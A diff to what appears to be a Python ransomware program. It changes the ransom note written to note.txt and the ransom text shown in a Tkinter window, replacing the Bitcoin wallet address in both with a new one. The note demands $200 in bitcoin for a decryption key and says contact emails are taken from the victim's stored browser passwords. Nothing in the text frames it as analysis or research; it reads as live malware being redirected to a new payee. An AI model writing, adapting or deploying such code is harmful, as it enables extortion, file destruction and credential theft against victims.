@@ -226,7 +226,7 @@ for files in filelist:
 #Create note.txt
 f = open("note.txt", "w+")
 
-f.write("Your important files have been encrypted using millitary grade encryption\nTo get your files back, the only way to do so is to pay\n$200 worth of bitcoin to\nbc1qruaeqr9adrszalwct6lydy02pat746hewns4st\nAfter you pay you will recieve an email from us in 1-18 hours with your decryption key\nWe get this email from your browser passwords\nFeel safe, we take no other passwords, and this is only so we can contact you.")
+f.write("Your important files have been encrypted using millitary grade encryption\nTo get your files back, the only way to do so is to pay\n$200 worth of bitcoin to\nbc1q8j527wn79uwvql3hc455w954mj49ht0puq7ugn\nAfter you pay you will recieve an email from us in 1-18 hours with your decryption key\nWe get this email from your browser passwords\nFeel safe, we take no other passwords, and this is only so we can contact you.")
 
 f.close()
 
@@ -244,7 +244,7 @@ canvas = Canvas(window, width=800, height=700, bg="darkgray")
 canvas.create_text(400, 50, text="Your important files have been encrypted", fill="red", font=('Helvetica 30 bold'))
 canvas.create_text(400, 200, text="Read the wallpaper for info, if the wallpaper did not change, view note.txt", fill="red", font=('Helvetica 16 bold'))
 canvas.create_text(400, 350, text="Send $200 worth of bitcoin to the address below", fill="red", font=('Helvetica 16 bold'))
-canvas.create_text(400, 500, text="Address -> bc1qth6t8tkazatundaq7fgncnsyrkgvm8dhr80hcr", fill="red", font=('Helvetica 20 bold'))
+canvas.create_text(400, 500, text="Address -> bc1q8j527wn79uwvql3hc455w954mj49ht0puq7ugn", fill="red", font=('Helvetica 20 bold'))
 canvas.create_text(400, 650, text="Put your decryption key below", fill="red", font=('Helvetica 20 bold'))
 canvas.pack()
 
